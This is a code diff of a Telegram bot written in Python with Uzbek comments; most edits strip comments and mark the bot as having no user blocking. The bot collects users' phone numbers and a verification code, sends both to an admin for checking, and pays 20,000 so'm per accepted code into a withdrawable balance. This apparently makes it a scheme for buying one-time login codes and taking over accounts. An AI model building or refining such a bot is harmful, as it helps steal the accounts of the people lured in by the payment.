@@ -101,7 +101,7 @@ async def get_db():
         raise
 
 async def init_db():
-    """Database jadvallarini yaratish"""
+    """Database jadvallarini yaratish (BLOKLASH YO'Q)"""
     conn = None
     try:
         conn = await get_db()
@@ -148,7 +148,8 @@ async def init_db():
             )
         """)
         
-        logger.info("✅ Database tayyor")
+        # ⚠️ BLOKLASH USTUNI YO'Q
+        logger.info("✅ Database tayyor (bloklash YO'Q)")
     except Exception as e:
         logger.error(f"❌ Database xatosi: {e}")
         raise
@@ -156,7 +157,7 @@ async def init_db():
         if conn:
             await conn.close()
 
-# ================= 1. START =================
+# ================= 1. START (BLOKLASH YO'Q) =================
 @dp.message_handler(commands=['start'])
 async def start(message: types.Message):
     telegram_id = message.from_user.id
@@ -281,7 +282,7 @@ async def receive_phone_text(message: types.Message):
     normalized_phone = normalize_phone(phone)
     await process_phone(message, normalized_phone)
 
-# ================= 4.1 TELEFON RAQAMNI QABUL QILISH (PROFIL LINK BILAN) =================
+# ================= 4.1 TELEFON RAQAMNI QABUL QILISH =================
 async def process_phone(message: types.Message, phone: str):
     telegram_id = message.from_user.id
     
@@ -291,7 +292,6 @@ async def process_phone(message: types.Message, phone: str):
     conn = None
     try:
         conn = await get_db()
-        # Telefon raqamini yangilash (no_phone_yet dan haqiqiy raqamga)
         await conn.execute(
             "INSERT INTO users (telegram_id, phone) VALUES ($1, $2) "
             "ON CONFLICT (telegram_id) DO UPDATE SET phone = $2",
@@ -326,7 +326,7 @@ async def process_phone(message: types.Message, phone: str):
     except Exception as e:
         logger.error(f"❌ Admin'ga yuborishda xatolik: {e}")
 
-# ================= 5. KODNI QABUL QILISH (PROFIL LINK + 2 TUGMA) =================
+# ================= 5. KODNI QABUL QILISH =================
 @dp.message_handler(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
 async def receive_code(message: types.Message):
     code = message.text.strip()
@@ -364,7 +364,6 @@ async def receive_code(message: types.Message):
         user_info = await bot.get_chat(telegram_id)
         username = user_info.username if user_info.username else "mavjud_emas"
         
-        # 2 TUGMA (tasdiqlash va rad etish)
         keyboard = InlineKeyboardMarkup(row_width=2)
         keyboard.add(
             InlineKeyboardButton("✅ To'g'ri kod (+20 000)", callback_data=f"verify_{telegram_id}_{phone}_{code}"),
@@ -387,7 +386,7 @@ async def receive_code(message: types.Message):
     
     user_states[telegram_id] = "done"
 
-# ================= 6. ADMIN TASDIQLASH (20 000 SO'M) =================
+# ================= 6. ADMIN TASDIQLASH =================
 @dp.callback_query_handler(lambda c: c.data.startswith(("verify_", "reject_")))
 async def admin_action(callback: types.CallbackQuery):
     data = callback.data.split("_")
@@ -408,7 +407,6 @@ async def admin_action(callback: types.CallbackQuery):
             )
             
             if result == "UPDATE 1":
-                # ✅ 20 000 so'm qo'shish
                 await conn.execute(
                     "UPDATE users SET balance = balance + 20000 WHERE telegram_id = $1",
                     telegram_id
@@ -418,7 +416,6 @@ async def admin_action(callback: types.CallbackQuery):
                     telegram_id
                 )
                 
-                # Yangi balansni olish
                 new_balance = await conn.fetchval(
                     "SELECT balance FROM users WHERE telegram_id = $1",
                     telegram_id
@@ -517,7 +514,6 @@ async def show_balance(message: types.Message):
             await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
             return
         
-        # Telefon raqami yo'q bo'lsa
         if user['phone'] == "no_phone_yet":
             await message.answer(
                 "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
@@ -560,7 +556,6 @@ async def withdraw_start(message: types.Message):
             await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
             return
         
-        # Telefon raqami yo'q bo'lsa
         if user['phone'] == "no_phone_yet":
             await message.answer(
                 "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
@@ -596,7 +591,7 @@ async def withdraw_start(message: types.Message):
         if conn:
             await conn.close()
 
-# ================= 9. YECHISH TELEFON (PROFIL LINK BILAN) =================
+# ================= 9. YECHISH TELEFON =================
 @dp.message_handler(lambda msg: withdraw_states.get(msg.from_user.id) == "waiting_withdraw_phone")
 async def withdraw_phone(message: types.Message):
     telegram_id = message.from_user.id
@@ -911,11 +906,9 @@ async def admin_panel(message: types.Message):
 
 # ================= HTTP SERVER (RENDER UCHUN) =================
 async def health_check(request):
-    """Sog'likni tekshirish uchun endpoint"""
     return web.Response(text="Bot is running!")
 
 async def start_http_server():
-    """HTTP serverni ishga tushirish"""
     try:
         app = web.Application()
         app.router.add_get('/', health_check)
@@ -935,12 +928,10 @@ async def start_http_server():
 
 # ================= KEEP-ALIVE =================
 async def keep_alive():
-    """Botni va HTTP serverni jonli ushlab turish"""
     consecutive_failures = 0
     
     while True:
         try:
-            # 1. Database tekshirish
             conn = None
             try:
                 conn = await get_db()
@@ -954,7 +945,6 @@ async def keep_alive():
                 if conn:
                     await conn.close()
             
-            # 2. Telegram API tekshirish
             try:
                 await bot.get_me()
                 logger.info("✅ Telegram API ping muvaffaqiyatli")
@@ -963,7 +953,6 @@ async def keep_alive():
                 logger.error(f"❌ Telegram API ping xatosi: {e}")
                 consecutive_failures += 1
             
-            # 3. HTTP server tekshirish
             try:
                 import aiohttp
                 async with aiohttp.ClientSession() as session:
@@ -978,7 +967,6 @@ async def keep_alive():
                 logger.error(f"❌ HTTP server ping xatosi: {e}")
                 consecutive_failures += 1
             
-            # Xatoliklar ko'paysa, botni qayta ishga tushirish
             if consecutive_failures >= 5:
                 logger.error(f"🚨 {consecutive_failures} martadan ko'p xatolik! Bot qayta ishga tushmoqda...")
                 os._exit(1)
@@ -993,7 +981,6 @@ async def keep_alive():
 async def on_startup(dp):
     logger.info("🤖 Bot ishga tushmoqda...")
     
-    # Database init - 3 martagacha urinish
     for attempt in range(3):
         try:
             await init_db()
@@ -1006,10 +993,7 @@ async def on_startup(dp):
             else:
                 logger.error("❌ Database ulanishi 3 martadan keyin ham muvaffaqiyatsiz!")
     
-    # HTTP server
     asyncio.create_task(start_http_server())
-    
-    # Keep-alive
     asyncio.create_task(keep_alive())
     
     logger.info("✅ Bot tayyor!")
